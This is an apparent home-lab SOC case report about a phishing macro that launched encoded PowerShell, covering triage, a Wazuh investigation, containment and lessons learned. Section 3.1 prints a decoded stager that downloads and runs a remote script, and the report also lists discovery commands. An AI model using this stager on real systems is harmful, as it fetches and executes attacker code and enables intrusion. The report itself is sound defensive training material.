# CASE-002 — Encoded PowerShell Launched from Word Macro

| Field | Value |
|---|---|
| Case ID | SOC-2026-0014 |
| Analyst | (you) |
| Opened | 2026-05-12 09:41 UTC |
| Closed | 2026-05-12 12:18 UTC |
| Severity | High |
| Disposition | True Positive — Host Reimaged |
| MITRE | T1566.001, T1059.001, T1003.001 |
| Playbook | [IR-001](../playbooks/IR-001-malware-infection.md) |

## 1. Alert

```
Rule:       100201 (level 12) — PowerShell spawned by Office product
Agent:      win10-01 (10.0.0.20)
User:       budi.santoso (test user)
Parent:     C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
Process:    powershell.exe -nop -w hidden -enc <base64 payload>
Timestamp:  2026-05-12 09:38:47 UTC
```

## 2. Triage (first 5 minutes)

Three red flags in the alert itself:
1. **Parent process is Word** — Office should never spawn PowerShell in normal use.
2. **`-nop -w hidden`** — running silently, no profile.
3. **`-enc <base64>`** — encoded payload, classic obfuscation.

This is a textbook macro-delivered payload. **High confidence true positive at triage.** Open IR-001.

## 3. Investigation

### 3.1 — Decode the payload

```powershell
[Text.Encoding]::Unicode.GetString(
  [Convert]::FromBase64String('<base64 from alert>')
)
```

Decoded:
```
$c = New-Object Net.WebClient;
$c.DownloadString('http://10.0.0.50:8000/stage2.ps1') | Invoke-Expression
```

→ Stager pulling from `10.0.0.50` (the Kali attack host in my lab).

### 3.2 — Did stage2 run?

Pivoted on the host in Wazuh:

```kql
agent.name:"win10-01" AND data.win.eventdata.parentImage:*powershell.exe
  AND @timestamp:[2026-05-12T09:38:00 TO 2026-05-12T09:45:00]
```

Found:
- `powershell.exe` → `whoami /all`
- `powershell.exe` → `nltest /domain_trusts`
- `powershell.exe` → `net group "Domain Admins" /domain`
- Suspicious LSASS access (rule **100302** fired) at 09:41:12 — **credential dumping attempted.**

### 3.3 — Did anything leave the host?

`data.win.eventdata.image:*powershell.exe AND data.win.eventdata.destinationPort:*` →
- One outbound to `10.0.0.50:4444` lasting 8 minutes. Likely C2 beacon.

### 3.4 — Lateral movement?

Searched `agent.name:* AND data.win.eventdata.user:budi.santoso` for the same window across all hosts → no logons elsewhere. **No lateral movement (yet).**

### 3.5 — The phishing vector

Asked the user via chat: had they opened any unusual documents? They confirmed opening `Invoice_April.docm` from email earlier that morning. File still in `C:\Users\budi.santoso\Downloads\`.

VirusTotal hash check: **42/72 vendors flag as malicious** (macro downloader).

## 4. Response

| Step | Time | Action |
|---|---|---|
| Containment | 09:55 | Isolated win10-01 via Wazuh Active Response (firewall-drop on the host) |
| Preserve | 10:05 | VM snapshot taken before any cleanup |
| Credentials | 10:10 | Forced password reset for `budi.santoso`, invalidated AD tickets |
| Block C2 | 10:15 | pfSense block on 10.0.0.50:4444 (lab-internal, but documents the workflow) |
| Email purge | 10:30 | Searched for other recipients of the same attachment hash → 0 hits (lab) |
| Reimage | 11:40 | win10-01 reimaged from clean Windows 10 baseline |
| Restore | 12:10 | User documents restored from backup snapshot taken 2026-05-11 |

## 5. Closure & Lessons

**Disposition:** True positive. Full kill chain observed: initial access (macro) → execution (PowerShell stager) → discovery (whoami/nltest/net) → credential access (LSASS read attempt) → C2 beacon. Contained before lateral movement.

**What worked:**
- Rule 100201 fired in <1 minute of the macro running — the parent-process pattern is high signal.
- Wazuh pivoting by hostname + user surfaced the full kill chain quickly.

**What I'd improve:**
- Add detection for `nltest`, `net group "Domain Admins"`, and other discovery commands — they should not run from PowerShell on a user workstation. Plan to add as rule `100210`.
- Email gateway should strip / sandbox `.docm` from external senders. Need a separate ticket for the mail team.
- Sysmon event 11 (FileCreate) for office downloads folder is noisy but would have shown the dropper file write seconds before execution. Worth filtering and keeping.

**IoCs added to watchlist:**
- SHA-256 of `Invoice_April.docm`
- C2 host 10.0.0.50 (lab-internal — would be external IP in prod)
- The base64-encoded stager body (regex-ed for in-org hunts)
